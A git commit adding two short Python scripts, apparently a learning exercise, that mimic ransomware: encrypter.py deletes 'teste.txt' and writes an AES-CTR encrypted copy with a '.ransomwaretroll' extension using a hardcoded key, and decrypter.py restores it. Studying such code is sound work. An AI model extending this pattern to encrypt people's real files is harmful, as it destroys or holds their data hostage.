e947383a39ddbf91b4888877fa6562de5303a9de
Guilh3rm3Maci3l <116690354+Guilh3rm3Maci3l@users.noreply.github.com>
2025-01-31 18:17:24 -0300

    Codificador e decodificador
    Arquivos para codificar e decodificar o texto de exemplo

---
+++ decrypter.py
@@ -0,0 +1,16 @@
+import os
+import pyaes
+
+file_name = "teste.txt.ransomwaretroll"
+with open(file_name, "rb") as file:
+    file_data = file.read()
+
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+decrypt_data = aes.decrypt(file_data)
+
+os.remove(file_name)
+
+new_file = "teste.txt"
+with open(new_file, "wb") as new_file:
+    new_file.write(decrypt_data)
---
+++ encrypter.py
@@ -0,0 +1,17 @@
+import os
+import pyaes
+
+file_name = "teste.txt"
+with open(file_name, "rb") as file:
+    file_data = file.read()
+
+os.remove(file_name)
+
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+crypto_data = aes.encrypt(file_data)
+
+new_file = file_name + ".ransomwaretroll"
+with open(new_file, 'wb') as new_file:
+    new_file.write(crypto_data)
